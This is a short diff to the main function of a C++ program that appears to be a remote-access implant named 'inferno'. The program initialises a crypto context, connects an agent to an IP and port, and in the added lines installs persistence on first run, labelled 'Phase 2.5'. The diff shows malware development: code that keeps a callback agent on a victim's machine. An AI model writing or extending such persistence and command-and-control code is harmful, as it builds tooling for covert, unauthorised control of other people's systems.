@@ -79,6 +79,11 @@ int main(int argc, char* argv[]) {
     }
 
     inferno::CryptoContext::instance().initDefault();
+
+    // Install persistence on first run (Phase 2.5)
+    if (argc > 0 && argv[0]) {
+        inferno::Agent::installPersistence(argv[0]);
+    }
     
     inferno::Agent agent(ip, port);
     agent.run();
